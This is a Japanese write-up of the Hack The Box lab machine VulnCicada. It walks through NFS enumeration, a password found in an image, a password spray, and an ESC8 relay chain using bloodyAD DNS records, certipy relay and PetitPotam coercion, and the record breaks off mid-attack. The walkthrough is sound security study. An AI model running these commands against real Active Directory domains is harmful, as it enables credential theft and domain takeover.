![](https://i.imgur.com/MFFHLmO.png)


- URL : https://app.hackthebox.com/machines/VulnCicada
- #medium 
- OS : #Windows
- Machine Author(s): [xct](https://app.hackthebox.com/users/13569)
- Hack Date: 2025-10-22/23

# Enumeration
Principle
1. **目に見えるものだけがすべてではない。** あらゆる視点を考慮しろ
2. 見えていることと、見えていないことを区別しろ
3. **常に情報を得る手段は存在する。** 対象をしっかり理解しろ

## Nmap

| **ポート**   | **サービス**     | **バージョン**                                           | **その他**                                                                      |
| --------- | ------------ | --------------------------------------------------- | ---------------------------------------------------------------------------- |
| 53/tcp    | **DNS**      | Simple DNS Plus                                     |                                                                              |
| 80/tcp    | **HTTP**     | Microsoft IIS httpd 10.0                            | HTTPメソッド: OPTIONS, TRACE, GET, HEAD, POST（TRACEはリスクあり）                       |
| 88/tcp    | **Kerberos** | Microsoft Windows Kerberos                          | サーバー時刻: 2025-10-22 08:51:41Z                                                 |
| 111/tcp   | rpcbind      | RPC 2-4 (RPC #100000)                               | 提供サービス: nfs, mountd など                                                       |
| 135/tcp   | msrpc        | Microsoft Windows RPC                               |                                                                              |
| 139/tcp   | netbios-ssn  | Microsoft Windows netbios-ssn                       |                                                                              |
| 389/tcp   | **LDAP**     | Microsoft Windows Active Directory LDAP             | ドメイン: cicada.vl0.／サイト: Default-First-Site-Name（証明書有効: 2025-10-22〜2026-10-22） |
| 445/tcp   | **SMB**      | SMB (推定)                                            |                                                                              |
| 464/tcp   | kpasswd5     | Kerberosパスワード変更サービス（推定）                             |                                                                              |
| 593/tcp   | ncacn_http   | Microsoft Windows RPC over HTTP 1.0                 |                                                                              |
| 636/tcp   | **LDAPS**    | Microsoft Windows AD LDAP over SSL                  | 証明書: DC-JPQ225.cicada.vl／有効期限 2025-10-22〜2026-10-22                          |
| 2049/tcp  | **NFS**      | RPC 1-3 (RPC #100005)                               | NFS関連サービス                                                                    |
| 3268/tcp  | ldap         | Microsoft Windows AD LDAP (Global Catalog)          | 証明書情報あり（cicada.vl）                                                           |
| 3269/tcp  | ssl/ldap     | Microsoft Windows AD LDAP over SSL (Global Catalog) | 証明書情報あり（cicada.vl）                                                           |
| 3389/tcp  | **RDP**      | Microsoft Terminal Services (RDP)                   | 証明書: DC-JPQ225.cicada.vl／有効期限 2025-10-21〜2026-04-22                          |
| 5985/tcp  | **WinRM**    | Microsoft HTTPAPI httpd 2.0                         | WinRM（HTTP）                                                                  |
| 9389/tcp  | mc-nmf       | .NET Message Framing                                | Active Directory Web Services関連                                              |
| 49664/tcp | msrpc        | Microsoft Windows RPC                               |                                                                              |
| 49667/tcp | msrpc        | Microsoft Windows RPC                               |                                                                              |
| 63074/tcp | msrpc        | Microsoft Windows RPC                               |                                                                              |
| 63132/tcp | msrpc        | Microsoft Windows RPC                               |                                                                              |
| 63611/tcp | msrpc        | Microsoft Windows RPC                               |                                                                              |
| 63866/tcp | msrpc        | Microsoft Windows RPC                               |                                                                              |
| 65369/tcp | ncacn_http   | Microsoft Windows RPC over HTTP 1.0                 |                                                                              |
| 65370/tcp | msrpc        | Microsoft Windows RPC                               |                                                                              |

```bash
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
80/tcp    open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-10-22 08:51:41Z)
111/tcp   open  rpcbind       syn-ack ttl 127 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|_  100005  1,2,3       2049/udp6  mountd
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: cicada.vl0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC-JPQ225.cicada.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC-JPQ225.cicada.vl
| Issuer: commonName=cicada-DC-JPQ225-CA/domainComponent=cicada
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-10-22T07:58:33
| Not valid after:  2026-10-22T07:58:33
| MD5:   80a2:7e70:fe94:a8e4:b615:d23b:8320:05db
| SHA-1: f9fd:d959:5e6c:f58c:0420:6520:bbbb:7337:6058:b769
| -----BEGIN CERTIFICATE-----
<SNIP>
|_-----END CERTIFICATE-----
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: cicada.vl0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC-JPQ225.cicada.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC-JPQ225.cicada.vl
| Issuer: commonName=cicada-DC-JPQ225-CA/domainComponent=cicada
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-10-22T07:58:33
| Not valid after:  2026-10-22T07:58:33
| MD5:   80a2:7e70:fe94:a8e4:b615:d23b:8320:05db
| SHA-1: f9fd:d959:5e6c:f58c:0420:6520:bbbb:7337:6058:b769
| -----BEGIN CERTIFICATE-----
<SNIP>
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
2049/tcp  open  mountd        syn-ack ttl 127 1-3 (RPC #100005)
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: cicada.vl0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC-JPQ225.cicada.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC-JPQ225.cicada.vl
| Issuer: commonName=cicada-DC-JPQ225-CA/domainComponent=cicada
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-10-22T07:58:33
| Not valid after:  2026-10-22T07:58:33
| MD5:   80a2:7e70:fe94:a8e4:b615:d23b:8320:05db
| SHA-1: f9fd:d959:5e6c:f58c:0420:6520:bbbb:7337:6058:b769
| -----BEGIN CERTIFICATE-----
<SNIP>
|_-----END CERTIFICATE-----
3269/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: cicada.vl0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC-JPQ225.cicada.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC-JPQ225.cicada.vl
| Issuer: commonName=cicada-DC-JPQ225-CA/domainComponent=cicada
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-10-22T07:58:33
| Not valid after:  2026-10-22T07:58:33
| MD5:   80a2:7e70:fe94:a8e4:b615:d23b:8320:05db
| SHA-1: f9fd:d959:5e6c:f58c:0420:6520:bbbb:7337:6058:b769
| -----BEGIN CERTIFICATE-----
<SNIP>
|_-----END CERTIFICATE-----
3389/tcp  open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services
| ssl-cert: Subject: commonName=DC-JPQ225.cicada.vl
| Issuer: commonName=DC-JPQ225.cicada.vl
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-10-21T08:06:09
| Not valid after:  2026-04-22T08:06:09
| MD5:   5a72:d2ee:e4d7:57f8:ccc4:73f2:6fb3:7b84
| SHA-1: 9386:c487:21c5:0e27:fe6c:5d3a:3c20:eb28:5708:6812
| -----BEGIN CERTIFICATE-----
<SNIP>
|_-----END CERTIFICATE-----
|_ssl-date: 2025-10-22T08:53:34+00:00; 0s from scanner time.
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
63074/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
63132/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
63611/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
63866/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
65369/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
65370/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
```
FQDN : DC-JPQ225.cicada.vl
特に、最初のアカウントなどは与えられていない
匿名でログインできるか？何かあるか？
- NFS
- SMB
- LDAP
とりま、enum4-linux-ngを試すか
## Enum4-linux-ng
```sh
┌──(kali㉿kali)-[~/Desktop/HTB/VulnCicada]
└─$ enum4linux-ng -A  $Target_IP
ENUM4LINUX - next generation (v1.3.5)

 ==========================
|    Target Information    |
 ==========================
[*] Target ........... 10.129.112.28
[*] Username ......... ''
[*] Random Username .. 'qieyyklm'
[*] Password ......... ''
[*] Timeout .......... 5 second(s)

 ======================================
|    Listener Scan on 10.129.112.28    |
 ======================================
[*] Checking LDAP
[+] LDAP is accessible on 389/tcp
[*] Checking LDAPS
[+] LDAPS is accessible on 636/tcp
[*] Checking SMB
[+] SMB is accessible on 445/tcp
[*] Checking SMB over NetBIOS
[+] SMB over NetBIOS is accessible on 139/tcp

 =====================================================
|    Domain Information via LDAP for 10.129.112.28    |
 =====================================================
[*] Trying LDAP
[+] Appears to be root/parent DC
[+] Long domain name is: cicada.vl

 ============================================================
|    NetBIOS Names and Workgroup/Domain for 10.129.112.28    |
 ============================================================
[-] Could not get NetBIOS names information via 'nmblookup': timed out

 ==========================================
|    SMB Dialect Check on 10.129.112.28    |
 ==========================================
[*] Trying on 445/tcp
[+] Supported dialects and settings:
Supported dialects:
  SMB 1.0: false
  SMB 2.0.2: true
  SMB 2.1: true
  SMB 3.0: true
  SMB 3.1.1: true
Preferred dialect: SMB 3.0
SMB1 only: false
SMB signing required: true

 ============================================================
|    Domain Information via SMB session for 10.129.112.28    |
 ============================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[-] Could not enumerate domain information via unauthenticated SMB
[*] Enumerating via unauthenticated SMB session on 139/tcp
[-] SMB connection error on port 139/tcp: session failed

 ==========================================
|    RPC Session Check on 10.129.112.28    |
 ==========================================
[*] Check for anonymous access (null session)
[-] Could not establish null session: STATUS_NOT_SUPPORTED
[*] Check for guest access
[-] Could not establish guest session: STATUS_NOT_SUPPORTED
[-] Sessions failed, neither null nor user sessions were possible

 ================================================
|    OS Information via RPC for 10.129.112.28    |
 ================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found OS information via SMB
[*] Enumerating via 'srvinfo'
[-] Skipping 'srvinfo' run, not possible with provided credentials
[+] After merging OS information we have the following result:
OS: unknown                                                                                                                                                                                                                                 
OS version: not supported                                                                                                                                                                                                                   
OS release: null                                                                                                                                                                                                                            
OS build: null                                                                                                                                                                                                                              
Native OS: not supported                                                                                                                                                                                                                    
Native LAN manager: not supported                                                                                                                                                                                                           
Platform id: null                                                                                                                                                                                                                           
Server type: null                                                                                                                                                                                                                           
Server type string: null                                                                                                                                                                                                                    

[!] Aborting remainder of tests since sessions failed, rerun with valid credentials

Completed after 15.44 seconds

```
ドメイン : cicada.vl
SMBのゲストログインは無理そうだね
## NFS
なんかあるかな
```sh
┌──(kali㉿kali)-[~/Desktop/HTB/VulnCicada]
└─$ showmount -e $Target_IP
Export list for 10.129.112.28:
/profiles (everyone)
```
/profilesとかいうのあるな
マウントしてみるか

なんかまずは、ユーザー名のフォルダが出てきた
```sh
┌──(kali㉿kali)-[~/…/HTB/VulnCicada/target-NFS/profiles]
└─$ ls -la                                       
total 10
drwxrwxrwx+ 2 nobody nogroup 4096 Jun  3 10:21 .
drwxrwxrwx+ 2 nobody nogroup   64 Oct 22 08:06 ..
drwxrwxrwx+ 2 nobody nogroup   64 Sep 15  2024 Administrator
drwxrwxrwx+ 2 nobody nogroup   64 Sep 13  2024 Daniel.Marshall
drwxrwxrwx+ 2 nobody nogroup   64 Sep 13  2024 Debra.Wright
drwxrwxrwx+ 2 nobody nogroup   64 Sep 13  2024 Jane.Carter
drwxrwxrwx+ 2 nobody nogroup   64 Sep 13  2024 Jordan.Francis
drwxrwxrwx+ 2 nobody nogroup   64 Sep 13  2024 Joyce.Andrews
drwxrwxrwx+ 2 nobody nogroup   64 Sep 13  2024 Katie.Ward
drwxrwxrwx+ 2 nobody nogroup   64 Sep 13  2024 Megan.Simpson
drwxrwxrwx+ 2 nobody nogroup   64 Sep 13  2024 Richard.Gibbons
drwxrwxrwx+ 2 nobody nogroup   64 Sep 15  2024 Rosie.Powell
drwxrwxrwx+ 2 nobody nogroup   64 Sep 13  2024 Shirley.West
```
全部ではないかもしれないが、ユーザー名を取得できたのでAS-REP Roastingは試せるかも
とりあえず、中のフォルダを覗いてみる

全部の中を見てみる
```sh
┌──(kali㉿kali)-[~/…/HTB/VulnCicada/target-NFS/profiles]
└─$ sudo ls -la -R                  
.:
total 10
drwxrwxrwx+ 2 nobody nogroup 4096 Jun  3 10:21 .
drwxrwxrwx+ 2 nobody nogroup   64 Oct 22 08:06 ..
drwxrwxrwx+ 2 nobody nogroup   64 Sep 15  2024 Administrator
drwxrwxrwx+ 2 nobody nogroup   64 Sep 13  2024 Daniel.Marshall
drwxrwxrwx+ 2 nobody nogroup   64 Sep 13  2024 Debra.Wright
drwxrwxrwx+ 2 nobody nogroup   64 Sep 13  2024 Jane.Carter
drwxrwxrwx+ 2 nobody nogroup   64 Sep 13  2024 Jordan.Francis
drwxrwxrwx+ 2 nobody nogroup   64 Sep 13  2024 Joyce.Andrews
drwxrwxrwx+ 2 nobody nogroup   64 Sep 13  2024 Katie.Ward
drwxrwxrwx+ 2 nobody nogroup   64 Sep 13  2024 Megan.Simpson
drwxrwxrwx+ 2 nobody nogroup   64 Sep 13  2024 Richard.Gibbons
drwxrwxrwx+ 2 nobody nogroup   64 Sep 15  2024 Rosie.Powell
drwxrwxrwx+ 2 nobody nogroup   64 Sep 13  2024 Shirley.West

./Administrator:
total 1461
drwxrwxrwx+ 2 nobody nogroup      64 Sep 15  2024 .
drwxrwxrwx+ 2 nobody nogroup    4096 Jun  3 10:21 ..
drwx------+ 2 nobody nogroup      64 Sep 15  2024 Documents
-rwxrwxrwx+ 1 nobody nogroup 1490573 Sep 13  2024 vacation.png

./Administrator/Documents:
total 2
d---------+ 2 nobody nogroup  64 Sep 13  2024 '$RECYCLE.BIN'
drwx------+ 2 nobody nogroup  64 Sep 15  2024  .
drwxrwxrwx+ 2 nobody nogroup  64 Sep 15  2024  ..
----------+ 1 nobody nogroup 402 Sep 13  2024  desktop.ini

'./Administrator/Documents/$RECYCLE.BIN':
total 2
d---------+ 2 nobody nogroup  64 Sep 13  2024 .
drwx------+ 2 nobody nogroup  64 Sep 15  2024 ..
----------+ 1 nobody nogroup 129 Sep 13  2024 desktop.ini

./Daniel.Marshall:
total 5
drwxrwxrwx+ 2 nobody nogroup   64 Sep 13  2024 .
drwxrwxrwx+ 2 nobody nogroup 4096 Jun  3 10:21 ..

./Debra.Wright:
total 5
drwxrwxrwx+ 2 nobody nogroup   64 Sep 13  2024 .
drwxrwxrwx+ 2 nobody nogroup 4096 Jun  3 10:21 ..

./Jane.Carter:
total 5
drwxrwxrwx+ 2 nobody nogroup   64 Sep 13  2024 .
drwxrwxrwx+ 2 nobody nogroup 4096 Jun  3 10:21 ..

./Jordan.Francis:
total 5
drwxrwxrwx+ 2 nobody nogroup   64 Sep 13  2024 .
drwxrwxrwx+ 2 nobody nogroup 4096 Jun  3 10:21 ..

./Joyce.Andrews:
total 5
drwxrwxrwx+ 2 nobody nogroup   64 Sep 13  2024 .
drwxrwxrwx+ 2 nobody nogroup 4096 Jun  3 10:21 ..

./Katie.Ward:
total 5
drwxrwxrwx+ 2 nobody nogroup   64 Sep 13  2024 .
drwxrwxrwx+ 2 nobody nogroup 4096 Jun  3 10:21 ..

./Megan.Simpson:
total 5
drwxrwxrwx+ 2 nobody nogroup   64 Sep 13  2024 .
drwxrwxrwx+ 2 nobody nogroup 4096 Jun  3 10:21 ..

./Richard.Gibbons:
total 5
drwxrwxrwx+ 2 nobody nogroup   64 Sep 13  2024 .
drwxrwxrwx+ 2 nobody nogroup 4096 Jun  3 10:21 ..

./Rosie.Powell:
total 1797
drwxrwxrwx+ 2 nobody nogroup      64 Sep 15  2024 .
drwxrwxrwx+ 2 nobody nogroup    4096 Jun  3 10:21 ..
drwx------+ 2 nobody nogroup      64 Sep 15  2024 Documents
-rwx------+ 1 nobody nogroup 1832505 Sep 13  2024 marketing.png

./Rosie.Powell/Documents:
total 2
drwx------+ 2 nobody nogroup  64 Sep 13  2024 '$RECYCLE.BIN'
drwx------+ 2 nobody nogroup  64 Sep 15  2024  .
drwxrwxrwx+ 2 nobody nogroup  64 Sep 15  2024  ..
-rwx------+ 1 nobody nogroup 402 Sep 13  2024  desktop.ini

'./Rosie.Powell/Documents/$RECYCLE.BIN':
total 2
drwx------+ 2 nobody nogroup  64 Sep 13  2024 .
drwx------+ 2 nobody nogroup  64 Sep 15  2024 ..
-rwx------+ 1 nobody nogroup 129 Sep 13  2024 desktop.ini

./Shirley.West:
total 5
drwxrwxrwx+ 2 nobody nogroup   64 Sep 13  2024 .
drwxrwxrwx+ 2 nobody nogroup 4096 Jun  3 10:21 ..

```
AdministratorとRosie.Powellには何かありそうだけど、特にはなさそう
だけど、marketing.pngとvacation.pngは何かあるかも？
見てみる

vacation.png
![](https://i.imgur.com/Y6OqUba.png)

marketing.png
![](https://i.imgur.com/16tmBhk.png)
なんか、パスワードっぽいメモが見えない？？？？！！！！
これは、Rosie.Powellか、誰かのパスワードな可能性があるな！！

とりあえず、AS-REP Roastingとパスワード(Cicada123)のパスワードスプレー攻撃を試すか
これらでダメだったら、ステガノグラフィとかかもしれないかな？
- ステガノグラフィにも何かあるかと思ったら、自分はできませんでした。
	- ただ詰まるだけです。(多分)
		- 具体的には、marketing.pngにPGP Keyが含まれていると出るのだが、うまく抽出できない。
		- こっちの道があったら教えてほしいです。

## AS-REP Roasting
やってみる
```sh
┌──(kali㉿kali)-[~/Desktop/HTB/VulnCicada]
└─$ impacket-GetNPUsers cicada.vl/ -dc-ip 10.129.112.28 -no-pass -usersfile valid_ad_users -format hashcat -outputfile asrep_hashes.txt
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Daniel.Marshall doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Debra.Wright doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Jane.Carter doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Jordan.Francis doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Joyce.Andrews doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Katie.Ward doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Megan.Simpson doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Richard.Gibbons doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Rosie.Powell doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)

```
なさそう

## パスワードスプレー攻撃
やってみる
```bash
┌──(venv)─(kali㉿kali)-[~/Desktop/HTB/VulnCicada]
└─$ netexec smb DC-JPQ225.cicada.vl -u valid_ad_users -p 'Cicada123' -d cicada.vl -k
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [*]  x64 (name:DC-JPQ225) (domain:cicada.vl) (signing:True) (SMBv1:False) (NTLM:False)
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [-] cicada.vl\Administrator:Cicada123 KDC_ERR_PREAUTH_FAILED 
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [-] cicada.vl\Daniel.Marshall:Cicada123 KDC_ERR_PREAUTH_FAILED 
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [-] cicada.vl\Debra.Wright:Cicada123 KDC_ERR_PREAUTH_FAILED 
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [-] cicada.vl\Jane.Carter:Cicada123 KDC_ERR_PREAUTH_FAILED 
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [-] cicada.vl\Jordan.Francis:Cicada123 KDC_ERR_PREAUTH_FAILED 
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [-] cicada.vl\Joyce.Andrews:Cicada123 KDC_ERR_PREAUTH_FAILED 
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [-] cicada.vl\Katie.Ward:Cicada123 KDC_ERR_PREAUTH_FAILED 
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [-] cicada.vl\Megan.Simpson:Cicada123 KDC_ERR_PREAUTH_FAILED 
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [-] cicada.vl\Richard.Gibbons:Cicada123 KDC_ERR_PREAUTH_FAILED 
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [+] cicada.vl\Rosie.Powell:Cicada123 
```
お、なんかRosie.PowellのパスワードがCicada123ということがわかった

### Rosie.Powellの認証情報
Rosie.Powell : Cicada123

チケットを取得する
```sh
┌──(venv)─(kali㉿kali)-[~/Desktop/HTB/VulnCicada/lsb_image_stego]
└─$ kinit Rosie.Powell@CICADA.VL
Password for Rosie.Powell@CICADA.VL: 

┌──(venv)─(kali㉿kali)-[~/Desktop/HTB/VulnCicada/lsb_image_stego]
└─$ klist                       
Ticket cache: FILE:/tmp/krb5cc_1000
Default principal: Rosie.Powell@CICADA.VL

Valid starting     Expires            Service principal
10/22/25 12:39:37  10/22/25 22:39:37  krbtgt/CICADA.VL@CICADA.VL
        renew until 10/23/25 12:39:23
```
チケットを取得できた

### SMB
SMBにはログインできるのか？
```sh
┌──(venv)─(kali㉿kali)-[~/Desktop/HTB/VulnCicada]
└─$ nxc smb DC-JPQ225.cicada.vl -u 'Rosie.Powell' -p 'Cicada123' --shares -k
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [*]  x64 (name:DC-JPQ225) (domain:cicada.vl) (signing:True) (SMBv1:False) (NTLM:False)
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [+] cicada.vl\Rosie.Powell:Cicada123 
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [*] Enumerated shares
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        Share           Permissions     Remark
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        -----           -----------     ------
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        ADMIN$                          Remote Admin
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        C$                              Default share
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        CertEnroll      READ            Active Directory Certificate Services share
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        IPC$            READ            Remote IPC
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        NETLOGON        READ            Logon server share 
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        profiles$       READ,WRITE      
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        SYSVOL          READ            Logon server share 
```
なんか、CertEnrollとかいうフォルダを見ることができるらしい
証明書で何かないかな？
# FootHold・PrivilegeEscalation
## Certpy
なんか、一応CertPyとかもやっておくか
脆弱な証明書がないのかを確かめる
```sh
┌──(venv)─(kali㉿kali)-[~/Desktop/HTB/VulnCicada]
└─$ certipy-ad find -k -no-pass -target DC-JPQ225.cicada.vl -dc-ip 10.129.112.28 -enabled -vulnerable  -stdout
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 13 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'cicada-DC-JPQ225-CA' via RRP
[*] Successfully retrieved CA configuration for 'cicada-DC-JPQ225-CA'
[*] Checking web enrollment for CA 'cicada-DC-JPQ225-CA' @ 'DC-JPQ225.cicada.vl'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : cicada-DC-JPQ225-CA
    DNS Name                            : DC-JPQ225.cicada.vl
    Certificate Subject                 : CN=cicada-DC-JPQ225-CA, DC=cicada, DC=vl
    Certificate Serial Number           : 416ECD442107F4A4416DF1A0FF2DDD59
    Certificate Validity Start          : 2025-10-22 08:02:12+00:00
    Certificate Validity End            : 2525-10-22 08:12:12+00:00
    Web Enrollment
      HTTP
        Enabled                         : True
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : CICADA.VL\Administrators
      Access Rights
        ManageCa                        : CICADA.VL\Administrators
                                          CICADA.VL\Domain Admins
                                          CICADA.VL\Enterprise Admins
        ManageCertificates              : CICADA.VL\Administrators
                                          CICADA.VL\Domain Admins
                                          CICADA.VL\Enterprise Admins
        Enroll                          : CICADA.VL\Authenticated Users
    [!] Vulnerabilities
      ESC8                              : Web Enrollment is enabled over HTTP.
Certificate Templates                   : [!] Could not find any certificate templates
```
ESC8が脆弱らしい！
ESC8を使って、FootPrintを取得する

## 脆弱なESC8を利用した攻撃
DNS レコードを偽装する
bloodyADを使って、不正なDNSレコードを追加
- DNSレコード : `DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA`
	- DC-JPQ225
		- 正規のドメインコントローラー名
	- `UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA`
		- 空のCREDENTIAL_TARGET_INFORMATION構造体
		- NTLMの空のNTハッシュ的な？
```sh
┌──(kali㉿kali)-[~/Desktop/HTB/VulnCicada]
└─$ bloodyAD -u Rosie.Powell -p Cicada123 -d cicada.vl -k --host DC-JPQ225$.cicada.vl add dnsRecord DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA 10.10.16.20
[+] DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA has been successfully added
```
成功した

Certipy Relayを起動する
- ADCSのWebサーバーをターゲットに中継サーバーを起動
```sh
┌──(kali㉿kali)-[~/Desktop/HTB/VulnCicada]
└─$ certipy-ad relay -target 'http://dc-jpq225.cicada.vl/' -template DomainController
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Targeting http://dc-jpq225.cicada.vl/certsrv/certfnsh.asp (ESC8)
[*] Listening on 0.0.0.0:445
[*] Setting up SMB Server on port 445
```

認証の強制
- netexecのcoerce_plusモジュールで、DCが何に脆弱なのかを調べる
```sh
┌──(kali㉿kali)-[~/Desktop/HTB/VulnCicada]
└─$ netexec smb DC-JPQ225.cicada.vl  -u Rosie.Powell -p Cicada123 -k -M coerce_plus 
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [*]  x64 (name:DC-JPQ225) (domain:cicada.vl) (signing:True) (SMBv1:False) (NTLM:False)
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [+] cicada.vl\Rosie.Powell:Cicada123 
COERCE_PLUS DC-JPQ225.cicada.vl 445    DC-JPQ225        VULNERABLE, DFSCoerce
COERCE_PLUS DC-JPQ225.cicada.vl 445    DC-JPQ225        VULNERABLE, PetitPotam
COERCE_PLUS DC-JPQ225.cicada.vl 445    DC-JPQ225        VULNERABLE, PrinterBug
COERCE_PLUS DC-JPQ225.cicada.vl 445    DC-JPQ225        VULNERABLE, PrinterBug
COERCE_PLUS DC-JPQ225.cicada.vl 445    DC-JPQ225        VULNERABLE, MSEven
```

- netexecのPetitPotamモジュールを使って、DCのマシンアカウント（DC-JPQ225$）に攻撃者のSMBサーバーへの認証を強制する
```sh
┌──(kali㉿kali)-[~/Desktop/HTB/VulnCicada/krbrelayx]
└─$ netexec smb DC-JPQ225.cicada.vl -u Rosie.Powell -p Cicada123 -k -M coerce_plus -o LISTENER=DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA METHOD=PetitPotam
